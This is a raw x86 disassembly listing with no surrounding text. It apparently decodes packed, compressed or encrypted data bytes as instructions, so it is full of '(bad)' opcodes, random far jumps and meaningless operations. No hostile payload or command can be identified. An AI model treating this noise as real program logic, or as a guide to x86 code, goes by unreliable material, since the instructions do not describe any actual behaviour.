  415b06:	scas   eax,DWORD PTR es:[edi]
  415b07:	pop    ebp
  415b08:	repnz lea esp,[ebx]
  415b0b:	out    dx,eax
  415b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0d:	sub    BYTE PTR [ecx+0xae],bl
	...
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcom   QWORD PTR [ecx+ecx*8]
  415b82:	fidiv  WORD PTR [edi+0x28]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	loopne 0x415b6c
  415b8e:	daa    
  415b8f:	mov    al,0x85
  415b91:	int    0xf9
  415b93:	and    eax,0x401d1f69
  415b98:	mov    al,BYTE PTR [edi-0x1891c40a]
  415b9e:	icebp  
  415b9f:	jmp    0x4991b7fc
  415ba4:	imul   edx,DWORD PTR [eax-0x4e037d9e],0x752f7ae1
  415bae:	mov    esp,0xeb59a4fa
  415bb3:	ins    DWORD PTR es:[edi],dx
  415bb4:	dec    ecx
  415bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb6:	sub    esp,ecx
  415bb8:	pop    ecx
  415bb9:	mov    esp,0x747c2fdc
  415bbe:	dec    ebp
  415bbf:	enter  0x18fa,0x86
  415bc3:	out    dx,al
  415bc4:	aam    0x74
  415bc6:	stos   DWORD PTR es:[edi],eax
  415bc7:	out    0x2d,al
  415bc9:	ja     0x415c44
  415bcb:	push   edx
  415bcd:	mov    cs,WORD PTR [eax-0x29f4a828]
  415bd3:	jecxz  0x415b66
  415bd5:	push   edx
  415bd6:	adc    eax,0x5151b718
  415bdb:	scas   eax,DWORD PTR es:[edi]
  415bdc:	scas   eax,DWORD PTR es:[edi]
  415bdd:	cmp    ebp,DWORD PTR [edi+edx*8-0x43]
  415be1:	sbb    DWORD PTR [esp+ebx*1],eax
  415be4:	sar    DWORD PTR [ebp-0x6082cc54],0xec
  415beb:	xchg   ebp,eax
  415bec:	jne    0x415b81
  415bee:	retf   0x65f4
  415bf1:	inc    ebx
  415bf2:	imul   esp,DWORD PTR [edx+0x7f],0xffffffca
  415bf6:	pop    edx
  415bf7:	lds    esi,FWORD PTR [ebx+0xa]
  415bfa:	je     0x415c37
  415bfc:	push   es
  415bfd:	mov    ds,WORD PTR gs:[eax-0x71ad57ce]
  415c04:	lock pop ds
  415c06:	inc    ecx
  415c07:	sbb    ebp,DWORD PTR [edx+0x5ae2dbcc]
  415c0d:	jae    0x415b9a
  415c0f:	(bad)  
  415c10:	stc    
  415c11:	pusha  
  415c12:	fldenv ds:0x64886d3d
  415c18:	pushf  
  415c19:	jne    0x415c80
  415c1b:	lock scas eax,DWORD PTR es:[edi]
  415c1d:	cmp    ebx,DWORD PTR [edx-0x62]
  415c20:	add    al,0xe7
  415c22:	push   edx
  415c23:	test   BYTE PTR [edx],0xfc
  415c26:	ss pop ss
  415c28:	or     BYTE PTR [esi+0x65d70dfa],dh
  415c2e:	xor    ecx,DWORD PTR [eax]
  415c30:	in     al,0xc1
  415c32:	mov    ebp,0x30577a44
  415c37:	repnz pop edx
  415c39:	test   BYTE PTR [edx],dh
  415c3b:	int3   
  415c3c:	in     eax,0x5e
  415c3e:	sub    eax,0xd466c9c7
  415c43:	outs   dx,BYTE PTR ds:[esi]
  415c44:	pushf  
  415c45:	(bad)  
  415c46:	mov    eax,0x5f735f5d
  415c4b:	(bad)  
  415c4c:	jnp    0x415c7b
  415c4e:	mov    WORD PTR ss:[eax+0x1cb328b8],es
  415c55:	jbe    0x415c00
  415c57:	adc    al,0xad
  415c59:	int3   
  415c5a:	xchg   esp,eax
  415c5b:	fidivr DWORD PTR [ecx+0x61]
  415c5e:	mov    ecx,0xaa5a3276
  415c63:	sbb    bh,BYTE PTR [esi-0x11adff15]
  415c69:	or     edi,0x7d933500
  415c6f:	inc    esi
  415c70:	mov    ?,WORD PTR [esi*2+0x3d44e2da]
  415c77:	fwait
  415c78:	imul   ebp,DWORD PTR [edx],0x57f43980
  415c7e:	dec    eax
  415c7f:	bound  ebx,QWORD PTR [ebx+esi*4-0x5]
  415c83:	pop    eax
  415c84:	or     eax,0xd4ce83d2
  415c89:	jl     0x415c66
  415c8b:	fs js  0x415c63
  415c8e:	xor    dh,BYTE PTR [edx+0x0]
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x8930f01f
  415d03:	xchg   esi,eax
  415d04:	sub    al,0xe6
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	pushf  
  415d0d:	sbb    eax,0xf068e33d
  415d12:	jp     0x415d78
  415d14:	aam    0x5f
  415d16:	mov    esi,0xc27fe06d
  415d1b:	dec    esp
  415d1c:	adc    al,0x49
  415d1e:	mov    edi,0x63312b70
  415d23:	int3   
  415d24:	aad    0x89
  415d26:	loopne 0x415d3c
  415d28:	shr    eax,cl
  415d2a:	retf   
  415d2b:	fwait
  415d2c:	int3   
  415d2d:	ds push edi
  415d2f:	dec    ebx
  415d30:	mov    ebx,0x8ad9c50f
  415d35:	jo     0x415cfa
  415d37:	mov    ds:0xfa584c6,al
  415d3c:	fldcw  WORD PTR [ebx-0x1a4b2390]
  415d42:	xor    bl,BYTE PTR ds:0x2fa88387
  415d48:	mov    al,BYTE PTR [ecx+0x6427d5f2]
  415d4e:	push   ss
  415d4f:	sbb    BYTE PTR [ecx],ah
  415d51:	or     edx,esp
  415d53:	mov    ds:0x1d718d47,eax
  415d58:	stos   DWORD PTR es:[edi],eax
  415d59:	rcl    al,cl
  415d5b:	jb     0x415cf4
  415d5d:	cs ds cld 
  415d60:	push   ds
  415d61:	jno    0x415d09
  415d63:	push   0xc55da2b3
  415d68:	mov    esp,0x4a1127c0
  415d6d:	push   ecx
  415d6e:	push   ds
  415d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d70:	pop    ecx
  415d71:	mov    ?,WORD PTR [ebx]
  415d73:	fistp  WORD PTR [eax]
  415d75:	sbb    DWORD PTR [eax],esi
  415d77:	mov    ebx,ecx
  415d79:	repz xor esi,edx
  415d7c:	stos   DWORD PTR es:[edi],eax
  415d7d:	es jmp 0x415def
  415d80:	or     al,0xb2
  415d82:	jmp    0x1d1b2fdc
  415d87:	xor    DWORD PTR [edi],ebp
  415d89:	call   0x90ac3228
  415d8e:	dec    edx
  415d8f:	sub    DWORD PTR [ecx],edx
  415d91:	(bad)  
  415d92:	cmp    DWORD PTR [ebx+edx*1],edi
  415d95:	out    dx,al
  415d96:	retf   0x9583
  415d99:	mov    edx,0xd8523e31
  415d9e:	pop    es
  415d9f:	loope  0x415e15
  415da1:	pop    ss
  415da2:	adc    DWORD PTR ds:0xc518fe01,esi
  415da8:	shl    BYTE PTR [esi+edx*8+0x49e0f63b],1
  415daf:	mov    dh,0x25
  415db1:	mov    esi,0x65daaa5a
  415db6:	or     al,0x78
  415db8:	pop    ss
  415db9:	cmp    cl,BYTE PTR [eax+eax*8+0x515a5497]
  415dc0:	sub    bh,BYTE PTR [esi+ebp*1]
  415dc3:	mov    BYTE PTR [edx-0x71],dl
  415dc6:	add    cl,bl
  415dc8:	mov    ah,0xc6
  415dca:	add    ebx,DWORD PTR [esi+0x24]
  415dcd:	xsaves [ebx]
  415dd0:	cli    
  415dd1:	push   edi
  415dd2:	sti    
  415dd3:	sbb    eax,0x2e5c5719
  415dd8:	scas   al,BYTE PTR es:[edi]
  415dd9:	shr    BYTE PTR [esp+ebx*2+0x775cd7c4],cl
  415de0:	pop    eax
  415de1:	mov    eax,ds:0xa3cc27c4
  415de6:	jg     0x415dc1
  415de8:	cmp    al,0x1b
  415dea:	xchg   esp,eax
  415deb:	stc    
  415dec:	mov    bh,0x8c
  415dee:	gs popf 
  415df0:	or     ch,BYTE PTR [edx+0x6c]
  415df3:	xchg   esp,ebx
  415df5:	xchg   edx,eax
  415df6:	push   ds
  415df7:	or     ah,BYTE PTR [esi+eiz*2+0x60234a71]
  415dfe:	sub    DWORD PTR [ecx+ebp*1],esi
  415e01:	push   edi
  415e02:	mov    ds:0x2277b02a,al
  415e07:	ds popa 
  415e09:	retf   
  415e0a:	pop    ds
  415e0b:	shl    DWORD PTR [bx+di-0x28c2],1
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x1a]
  415e81:	mov    edi,0xe730b70a
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	push   ebx
  415e8d:	mov    eax,0x12b7e191
  415e92:	add    edx,DWORD PTR [eax-0x4ce4668e]
  415e98:	fst    st(4)
  415e9a:	lods   eax,DWORD PTR ds:[esi]
  415e9b:	test   BYTE PTR [ebx+ebp*8],bl
  415e9e:	lock leave 
  415ea0:	cdq    
  415ea1:	fwait
  415ea2:	adc    eax,0x84bb36d8
  415ea7:	push   ds
  415ea8:	inc    ebx
  415ea9:	into   
  415eaa:	retf   0x9f2
  415ead:	(bad)  
  415eae:	jno    0x415e81
  415eb0:	es xchg esp,eax
  415eb2:	das    
  415eb3:	inc    ebx
  415eb4:	retf   0x31e5
  415eb7:	mov    edx,0x78fb2130
  415ebc:	ins    BYTE PTR es:[edi],dx
  415ebd:	jo     0x415ea1
  415ebf:	adc    al,0xcc
  415ec1:	in     al,0x40
  415ec3:	les    ecx,FWORD PTR [edi]
  415ec5:	call   0x5d88:0xe6428e8d
  415ecc:	int3   
  415ecd:	stos   DWORD PTR es:[edi],eax
  415ece:	mov    ebp,0xff5398fd
  415ed3:	push   es
  415ed4:	mov    eax,0x7e8dec06
  415ed9:	cmp    al,0xb2
  415edb:	scas   al,BYTE PTR es:[edi]
  415edc:	pop    es
  415edd:	ds jle 0x415ec0
  415ee0:	xor    BYTE PTR [edi-0x42fed728],bl
  415ee6:	dec    ebp
  415ee7:	jnp    0x415f17
  415ee9:	ins    DWORD PTR es:[edi],dx
  415eea:	sub    BYTE PTR [eax-0x53],ah
  415eed:	push   ebx
  415eee:	mov    eax,0xadc2cce
  415ef3:	mov    edi,0x7d371ae3
  415ef8:	pop    esi
  415ef9:	scas   al,BYTE PTR es:[edi]
  415efa:	xlat   BYTE PTR ds:[ebx]
  415efb:	mov    bh,0x1b
  415efd:	stc    
  415efe:	mov    cl,0xd6
  415f00:	ja     0x415f42
  415f02:	outs   dx,DWORD PTR ds:[esi]
  415f03:	fsubr  DWORD PTR [eax]
  415f05:	xchg   ch,cl
  415f07:	out    dx,eax
  415f08:	push   edi
  415f09:	dec    ebx
  415f0a:	pop    edx
  415f0b:	std    
  415f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f0e:	push   esp
  415f0f:	sub    eax,0x5815d13e
  415f14:	mov    ds:0xecfe8f7d,al
  415f19:	sbb    BYTE PTR [eax+eiz*2-0x21d4b4ee],dl
  415f20:	pop    eax
  415f21:	jns    0x415ef9
  415f23:	loop   0x415f06
  415f25:	mov    eax,0x7f45d0bd
  415f2a:	sbb    ecx,0x45
  415f2d:	shr    dl,cl
  415f2f:	sub    DWORD PTR [edx],esi
  415f31:	mov    dh,0x9
  415f33:	jb     0x415fac
  415f35:	int    0xcb
  415f37:	(bad)  
  415f38:	in     eax,dx
  415f39:	out    0x47,eax
  415f3b:	mov    dl,0x27
  415f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f3e:	dec    edi
  415f3f:	mov    eax,ds:0xcabde072
  415f44:	ds xchg si,ax
  415f47:	inc    edi
  415f48:	dec    edi
  415f49:	shl    DWORD PTR [edx+0x2f],cl
  415f4c:	loope  0x415f54
  415f4e:	inc    esp
  415f4f:	push   es
  415f50:	mov    edx,0x76fc2ab4
  415f55:	mov    DWORD PTR [ecx-0x111db370],ebp
  415f5b:	(bad)  
  415f5c:	mov    dh,0xfe
  415f5e:	and    eax,0x9d0499c5
  415f63:	int    0x44
  415f65:	xor    DWORD PTR ds:0x7e96f1a0,edx
  415f6b:	jb     0x415fdb
  415f6d:	inc    eax
  415f6e:	and    DWORD PTR [ecx],esi
  415f70:	ror    dh,0x18
  415f73:	mov    eax,0xd2274fa3
  415f78:	test   al,0x25
  415f7a:	(bad)  
  415f7b:	in     al,dx
  415f7c:	adc    bh,ch
  415f7e:	daa    
  415f7f:	xor    BYTE PTR [eax],0x74
  415f82:	std    
  415f83:	dec    edx
  415f84:	leave  
  415f85:	test   eax,0xda22797d
  415f8a:	pop    ds
  415f8b:	push   edi
  415f8c:	lea    eax,[eax]
  415f8e:	xor    DWORD PTR [eax+eax*1],esp
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	push   ebp
  416001:	mov    ah,0x9b
  416003:	aam    0x34
  416005:	call   0x145600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	out    dx,eax
  41600d:	mov    edi,0x56732fa6
  416012:	mov    esp,0x65893e6d
  416017:	popf   
  416018:	bswap  eax
  41601a:	mov    BYTE PTR [ebx],dh
  41601c:	popa   
  41601d:	jmp    0x416005
  41601f:	mov    ch,0xb0
  416021:	loop   0x415fc0
  416023:	sbb    DWORD PTR [edx+esi*8],0xffffffc7
  416027:	outs   dx,BYTE PTR ds:[esi]
  416028:	push   edi
  41602a:	xlat   BYTE PTR ds:[ebx]
  41602b:	jbe    0x41608c
  41602d:	dec    ebp
  41602e:	test   eax,0x29123787
  416033:	sti    
  416034:	out    0x8f,eax
  416036:	sahf   
  416037:	div    BYTE PTR [ebp+edx*4+0x4d521ee]
  41603e:	test   WORD PTR [edi+esi*4],bp
  416042:	push   ebx
  416043:	sbb    ebx,DWORD PTR gs:[edi]
  416046:	int3   
  416047:	dec    ebp
  416048:	out    dx,al
  416049:	adc    al,0x48
  41604b:	mov    ah,0x3e
  41604d:	mov    al,ds:0x136bf00a
  416052:	pop    ss
  416053:	jmp    0xf2ceae59
  416058:	sbb    DWORD PTR [ecx],esi
  41605a:	js     0x415fe9
  41605c:	xchg   ecx,edi
  41605e:	jmp    0x3997577f
  416063:	jae    0x416022
  416065:	or     DWORD PTR [edx],ebp
  416067:	xor    eax,0xccbdb031
  41606c:	enter  0xa5cc,0x21
  416070:	rol    BYTE PTR [edi+0x760cec9b],cl
  416076:	push   ebx
  416077:	mov    eax,0x8568f4f5
  41607c:	shr    esp,cl
  41607e:	arpl   WORD PTR [ebx+0x51cdbf5f],bx
  416084:	test   DWORD PTR [ebx+0x49],edi
  416087:	inc    eax
  416088:	cmp    ch,al
  41608a:	hlt    
  41608b:	jle    0x416010
  41608d:	xor    eax,0x87c53d04
  416092:	mov    dh,0xfb
  416094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416095:	jne    0x416097
  416097:	mov    esp,DWORD PTR [ecx-0x42]
  41609a:	call   0x54e33100
  41609f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160a0:	ret    
  4160a1:	mov    ds:0xb30d3a06,eax
  4160a6:	ror    ebx,0x15
  4160a9:	retf   
  4160aa:	imul   edi,DWORD PTR [esi-0x766b5a56],0xc2650faa
  4160b4:	jb     0x4160ee
  4160b6:	or     ebp,DWORD PTR [ecx+0x526bce4c]
  4160bc:	push   ds
  4160bd:	sub    ah,0xda
  4160c0:	xchg   ecx,eax
  4160c1:	bound  eax,QWORD PTR [esi]
  4160c3:	xchg   ebx,eax
  4160c4:	push   0xba0e7366
  4160c9:	aam    0x30
  4160cb:	xor    bh,al
  4160cd:	inc    esp
  4160ce:	jge    0x4160be
  4160d0:	iret   
  4160d1:	or     ebp,DWORD PTR ds:0x91b8855e
  4160d7:	push   0x22
  4160d9:	retf   0x6df
  4160dc:	jns    0x4160d2
  4160de:	add    DWORD PTR [edx],eax
  4160e0:	xor    al,0x75
  4160e2:	mov    ecx,0x535ad3c6
  4160e7:	pop    eax
  4160e8:	adc    al,0x3b
  4160ea:	clc    
  4160eb:	adc    eax,0xb7cef743
  4160f0:	jmp    0xb0d5bfe3
  4160f5:	outs   dx,BYTE PTR ds:[esi]
  4160f6:	pushf  
  4160f7:	pop    eax
  4160f8:	fsubr  DWORD PTR [ebp-0x20051fd4]
  4160fe:	xor    ebp,DWORD PTR [ebp-0x10759a65]
  416104:	(bad)  
  416105:	or     esi,DWORD PTR [esi]
  416107:	xor    DWORD PTR [eax-0x6142856b],esi
  41610d:	sub    eax,esi
  41610f:	outs   dx,BYTE PTR ds:[esi]
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x377bb6f3
  416183:	jl     0x4161bd
  416185:	jmp    0x145618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	and    edx,0xdc2a55a6
  416192:	clc    
  416193:	rcr    ah,1
  416195:	(bad)  
  416196:	xor    dl,dl
  416198:	and    esi,ecx
  41619a:	arpl   dx,sp
  41619c:	mov    al,0x91
  41619e:	and    al,0xeb
  4161a0:	outs   dx,BYTE PTR ds:[esi]
  4161a1:	cwde   
  4161a2:	sbb    ah,0x5
  4161a5:	xor    ah,ah
  4161a7:	into   
  4161a8:	test   DWORD PTR [esi+ebx*1-0x54],edi
  4161ac:	sub    BYTE PTR [ecx],ah
  4161ae:	xchg   esi,eax
  4161af:	xchg   esp,eax
  4161b0:	test   BYTE PTR [edx-0x4b],ah
  4161b3:	rcl    BYTE PTR [ebp+0x3a],1
  4161b6:	cld    
  4161b7:	push   edi
  4161b8:	shl    BYTE PTR [esi-0x4f44607a],1
  4161be:	adc    al,0x8d
  4161c0:	push   ss
  4161c1:	fbstp  TBYTE PTR [ebp-0x67]
  4161c4:	xlat   BYTE PTR ds:[ebx]
  4161c5:	clc    
  4161c6:	test   BYTE PTR [ecx-0x3f],dh
  4161c9:	out    0x25,eax
  4161cb:	enterw 0xd771,0x42
  4161d0:	xor    dl,cl
  4161d2:	push   edi
  4161d3:	inc    DWORD PTR [ebp+0x1444e0a7]
  4161d9:	mov    esi,0x2a36a5ce
  4161de:	dec    edx
  4161df:	in     eax,dx
  4161e0:	mov    BYTE PTR [edi],bl
  4161e2:	cmp    al,0x3e
  4161e4:	and    ah,bh
  4161e6:	test   eax,0xbbbd5901
  4161eb:	das    
  4161ec:	jecxz  0x416265
  4161ee:	push   ecx
  4161ef:	xlat   BYTE PTR ds:[ebx]
  4161f0:	inc    eax
  4161f1:	xchg   ecx,eax
  4161f2:	dec    DWORD PTR [edi-0x13]
  4161f5:	jl     0x41620f
  4161f7:	xchg   DWORD PTR [ebx+0x11453f0a],esi
  4161fd:	or     eax,0xd7ea1aa4
  416202:	stos   DWORD PTR es:[di],eax
  416204:	push   edx
  416205:	inc    ecx
  416206:	add    eax,0xb16c8164
  41620b:	and    dl,dl
  41620d:	pop    esp
  41620e:	imul   edx,DWORD PTR [ecx+0x4c],0xd9cc09aa
  416215:	xchg   esi,eax
  416216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416217:	ja     0x41622b
  416219:	repnz xor edx,ebx
  41621c:	jns    0x416215
  41621e:	xor    DWORD PTR ds:0x536225f8,esp
  416224:	pushf  
  416225:	daa    
  416226:	(bad)  
  416227:	mov    ch,0xd2
  416229:	mov    bl,0x74
  41622b:	xchg   ebx,eax
  41622c:	lods   al,BYTE PTR ds:[esi]
  41622d:	mov    ecx,0x17794791
  416232:	inc    esi
  416233:	jne    0x416270
  416235:	mov    DWORD PTR [esi-0x25b2a666],ecx
  41623b:	xchg   ecx,eax
  41623c:	jmp    0xe19905f2
  416241:	mov    ecx,eax
  416243:	lods   al,BYTE PTR ds:[esi]
  416244:	xchg   edx,eax
  416245:	xchg   edx,eax
  416246:	fsubr  DWORD PTR [edx]
  416248:	ja     0x41621e
  41624a:	dec    esp
  41624b:	stc    
  41624c:	lods   eax,DWORD PTR ds:[esi]
  41624d:	loop   0x416299
  41624f:	cmp    al,ah
  416251:	sar    BYTE PTR [eax],0x4f
  416254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416255:	inc    ebx
  416256:	xchg   ebp,eax
  416257:	push   0x7c
  416259:	test   ecx,0x755068ba
  41625f:	cld    
  416260:	mov    esp,0x12a49e14
  416265:	or     eax,0xe9df62d7
  41626a:	cdq    
  41626b:	out    0x25,ax
  41626e:	mov    esp,0xa49f33f6
  416273:	das    
  416274:	jl     0x4161fa
  416276:	push   esi
  416277:	xlat   BYTE PTR ds:[ebx]
  416278:	and    BYTE PTR [edi-0x80],bl
  41627b:	cmp    eax,0xb95ed6c7
  416280:	jae    0x4162f6
  416282:	jae    0x416291
  416284:	dec    ebp
  416285:	push   eax
  416286:	dec    edx
  416287:	jl     0x4162dc
  416289:	push   ds
  41628a:	jb     0x4162f7
  41628c:	pop    es
  41628d:	test   DWORD PTR [ebx+0x6c],edi
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c5a:0x5bf898ee
  416305:	jmp    0x0:0x1040000
  41630c:	add    al,0x6c
  41630e:	jne    0x4162b8
  416310:	call   0x3e6f:0xd289418b
  416317:	out    0xf4,eax
  416319:	push   0x254aaf0
  41631e:	clc    
  41631f:	push   0xffffffb6
  416321:	std    
  416322:	jg     0x416353
  416324:	sbb    DWORD PTR [ebp+0x160634c8],0x40c46fb6
  41632e:	dec    esi
  41632f:	bound  edx,QWORD PTR ds:[ebp+0x5048d8a3]
  416336:	outs   dx,DWORD PTR ds:[esi]
  416337:	nop
  416338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416339:	shl    DWORD PTR cs:[eax-0x4e05ba3],0x23
  416341:	in     eax,0xd4
  416343:	jp     0x41634e
  416345:	xchg   edi,eax
  416346:	mov    dl,0x87
  416348:	lock adc DWORD PTR [eax],0xb9dacb5e
  41634f:	loop   0x416352
  416351:	push   es
  416352:	mov    bl,0xdb
  416354:	aam    0x32
  416356:	inc    esi
  416357:	lods   eax,DWORD PTR ss:[esi]
  416359:	in     al,dx
  41635a:	and    BYTE PTR ss:[ebp+0x17],0xa4
  41635f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416360:	cmp    dl,bh
  416362:	call   0x629787ad
  416367:	mov    ebx,0xfce784bf
  41636c:	mov    bl,BYTE PTR [ecx+eiz*8]
  41636f:	xchg   edx,eax
  416370:	pop    es
  416371:	pushf  
  416372:	mov    BYTE PTR [ebx],bh
  416374:	adc    ch,BYTE PTR [edi]
  416376:	sub    DWORD PTR [edx+0x5b2a300],ebx
  41637c:	cmp    al,0xb8
  41637e:	out    0xde,al
  416380:	cmp    eax,0x6cedc686
  416385:	in     al,dx
  416386:	push   es
  416387:	cmp    al,0xd9
  416389:	adc    ah,BYTE PTR [eax]
  41638b:	bound  eax,QWORD PTR [esi]
  41638d:	xchg   edx,eax
  41638e:	adc    al,BYTE PTR [ebx]
  416390:	mov    eax,ds:0x762a4443
  416395:	mov    eax,ds:0xdce4c351
  41639a:	xor    al,0xcb
  41639c:	mov    bl,0x9a
  41639e:	(bad)  
  41639f:	cwde   
  4163a0:	xchg   esi,eax
  4163a1:	fidivr DWORD PTR [eax-0x3362afaf]
  4163a7:	fwait
  4163a8:	jbe    0x416418
  4163aa:	idiv   dh
  4163ac:	aaa    
  4163ad:	test   DWORD PTR [eax+0x7a16b7a],ebp
  4163b3:	pusha  
  4163b4:	inc    eax
  4163b5:	out    dx,al
  4163b6:	gs popa 
  4163b8:	xchg   esp,eax
  4163b9:	and    eax,0xa7df31a0
  4163be:	sbb    DWORD PTR [edx],esp
  4163c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c1:	into   
  4163c2:	mov    al,ds:0xf4a1c30c
  4163c7:	es out dx,eax
  4163c9:	sbb    ebp,esp
  4163cb:	stos   BYTE PTR es:[edi],al
  4163cc:	pop    eax
  4163cd:	inc    esp
  4163ce:	mov    ebx,0x5523b29f
  4163d3:	dec    eax
  4163d5:	push   0x30ff417c
  4163da:	hlt    
  4163db:	outs   dx,BYTE PTR ds:[esi]
  4163dc:	test   al,0x93
  4163de:	mov    cl,0xf5
  4163e0:	pop    eax
  4163e1:	adc    ebp,DWORD PTR [ebp+0x57]
  4163e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163e5:	adc    DWORD PTR [eax],0x9bff25c6
  4163eb:	ss jno 0x4163df
  4163ee:	cli    
  4163ef:	mov    ebx,0xae081989
  4163f4:	push   0x827e07c4
  4163f9:	scas   al,BYTE PTR es:[edi]
  4163fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163fb:	adc    DWORD PTR [edx+0x2a2dc898],0x67406673
  416405:	das    
  416406:	jb     0x416408
  416408:	stos   BYTE PTR es:[edi],al
  416409:	fisub  WORD PTR [edx]
  41640b:	rcl    ch,cl
  41640d:	push   esi
  41640e:	stc    
  41640f:	icebp  
	...
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	and    BYTE PTR [edi+0x6b],dh
  416483:	mov    eax,DWORD PTR [eax-0x15]
  416486:	add    BYTE PTR [eax],al
  416488:	add    al,0x1
  41648a:	add    BYTE PTR [eax],al
  41648c:	dec    DWORD PTR [edi]
  41648e:	outs   dx,DWORD PTR ds:[esi]
  41648f:	(bad)  
  416490:	cmp    BYTE PTR [edx+0x27b7e542],cl
  416496:	nop
  416497:	dec    ebx
  416498:	add    ch,BYTE PTR [edx-0x68048a2a]
  41649e:	in     eax,0x90
  4164a0:	fisub  DWORD PTR [ebp-0x6cc19a54]
  4164a6:	xchg   edx,eax
  4164a7:	pop    es
  4164a8:	mov    ecx,es
  4164aa:	(bad)  
  4164ab:	in     eax,dx
  4164ac:	in     eax,0x39
  4164ae:	push   esi
  4164af:	or     dx,di
  4164b2:	fisub  DWORD PTR [esi+0x7a]
  4164b5:	xchg   ecx,eax
  4164b6:	stos   BYTE PTR es:[edi],al
  4164b7:	adc    eax,0x9fdef2da
  4164bc:	into   
  4164bd:	add    eax,0x98e90286
  4164c2:	mov    DWORD PTR [ebp+0x60],ebp
  4164c5:	call   0x73e6:0xdd5ad206
  4164cc:	scas   al,BYTE PTR es:[edi]
  4164cd:	and    BYTE PTR [esi-0x80],0x4d
  4164d1:	es call 0xc9a2:0x2ab8fa0e
  4164d9:	sub    esp,DWORD PTR [ebx]
  4164db:	and    eax,0x75b1d850
  4164e0:	xchg   DWORD PTR [ecx+0x66],ecx
  4164e3:	ja     0x4164c0
  4164e5:	call   0x1ca639a0
  4164ea:	fcom   DWORD PTR [eax]
  4164ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ed:	mov    bh,0xc6
  4164ef:	mov    ch,0xa6
  4164f1:	add    edx,DWORD PTR [edi]
  4164f3:	mov    ch,0x13
  4164f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164f6:	(bad)  
  4164f8:	out    dx,al
  4164f9:	into   
  4164fa:	push   ecx
  4164fb:	cmp    al,0xfa
  4164fd:	and    eax,0x4e948d0f
  416502:	fmul   DWORD PTR [ebx]
  416504:	sbb    bl,BYTE PTR cs:[edx+0x119c9da4]
  41650b:	clc    
  41650c:	pop    eax
  41650d:	pop    ebp
  41650e:	lock jle 0x4164ea
  416511:	int    0x68
  416513:	mov    ah,0x14
  416515:	xchg   ecx,eax
  416516:	dec    ebx
  416517:	dec    esp
  416518:	or     edx,DWORD PTR [ebx]
  41651a:	adc    esi,DWORD PTR [edi-0x1c]
  41651d:	adc    BYTE PTR [ebx+0x6ec1965a],dh
  416523:	cs aam 0x3c
  416526:	sbb    al,0xb5
  416528:	dec    esi
  416529:	jne    0x416515
  41652b:	ins    BYTE PTR es:[edi],dx
  41652c:	rcl    al,cl
  41652e:	pop    ss
  41652f:	cmp    eax,DWORD PTR [edi+0x33]
  416532:	loop   0x41656a
  416534:	xchg   edi,eax
  416535:	adc    bl,dh
  416537:	xor    eax,0x8e2777b7
  41653c:	adc    BYTE PTR [eax-0x22e8fc1d],0x51
  416543:	mov    ds:0xe13e8a8c,eax
  416548:	aas    
  416549:	xchg   ebx,eax
  41654a:	xchg   esi,eax
  41654b:	pop    edi
  41654c:	or     BYTE PTR [esi-0x40d7f6b5],0x59
  416553:	xchg   bp,ax
  416555:	mov    edx,0x4d8b7149
  41655a:	outs   dx,DWORD PTR ds:[esi]
  41655c:	js     0x416591
  41655e:	icebp  
  41655f:	mov    edx,0xf1bc538a
  416564:	add    eax,0xef507cb1
  416569:	mov    esp,0x85bb7a8d
  41656e:	mov    esi,0xf5e2db11
  416573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416574:	or     DWORD PTR [edi+ebx*8],edx
  416577:	pop    ebp
  416578:	pushf  
  416579:	je     0x416545
  41657b:	mov    WORD PTR [edx+eiz*8],?
  41657e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41657f:	clc    
  416580:	retf   0x396e
